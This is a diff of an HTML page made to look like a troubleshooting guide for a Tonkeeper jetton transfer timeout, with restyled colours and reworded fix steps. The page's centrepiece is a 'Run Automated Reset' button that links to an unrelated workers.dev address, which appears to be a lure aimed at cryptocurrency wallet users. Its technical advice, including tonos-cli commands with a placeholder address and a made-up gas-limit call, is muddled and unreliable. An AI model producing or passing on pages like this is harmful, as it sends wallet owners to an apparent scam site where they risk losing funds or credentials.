@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and an inability to proceed with their intended actions.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timing issue in the Tonkeeper application, where the transfer loop exceeds the maximum allowed time, causing the transaction to timeout before completion.</li>
+<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, high gas fees, or issues with the Tonkeeper wallet configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Increase the timeout threshold in the Tonkeeper settings to allow for more time to complete the transaction.</li>
-<li>Verify the jetton balance and ensure sufficient funds are available for the transfer.</li>
-<li>Use the following command to update the Tonkeeper configuration:</li>
+<li>Increase the gas limit to prioritize the transaction and avoid timeouts: </li>
+<li>Update the Tonkeeper wallet configuration to use a higher gas limit</li>
+<li>Use the <code>tonos-cli</code> command to manually set the gas limit for the transfer transaction</li>
+<li>Utilize the following code block to adjust the transfer parameters:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">300</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>setGasLimit<span class="w"> </span><span class="m">1000000</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced configuration options.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper application installed and configured</li>
-<li>Sufficient jetton balance for the transfer</li>
-<li>Stable internet connection for transaction processing</li>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Basic understanding of TON blockchain and jetton transfer process</li>
+<li><code>tonos-cli</code> command-line tool installed and accessible</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
